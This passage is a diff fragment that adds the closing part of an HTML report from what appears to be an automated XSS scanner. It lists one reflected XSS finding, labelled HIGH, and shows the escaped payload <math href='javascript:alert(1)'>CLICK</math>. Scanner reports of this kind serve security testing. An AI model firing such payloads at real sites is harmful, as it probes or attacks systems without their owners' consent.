+                        <span class="meta-text">Reflected XSS</span>
+                        <span class="meta-text"><span class="severity-medium">HIGH</span></span>
+                    </div>
+                </td>
+                <td><div class="payload-box">&lt;math href=&#x27;javascript:alert(1)&#x27;&gt;CLICK&lt;/math&gt;</div></td>
+            </tr>
+            
+                </tbody>
+            </table>
+            
+            <footer style="margin-top: 50px; text-align: center; font-size: 0.8rem; color: #555;">
+                <p>Report generated by Automated XSS Scanner | Educational Purpose Only</p>
+            </footer>
+        </div>
+
+        </body>
+        </html>
+        
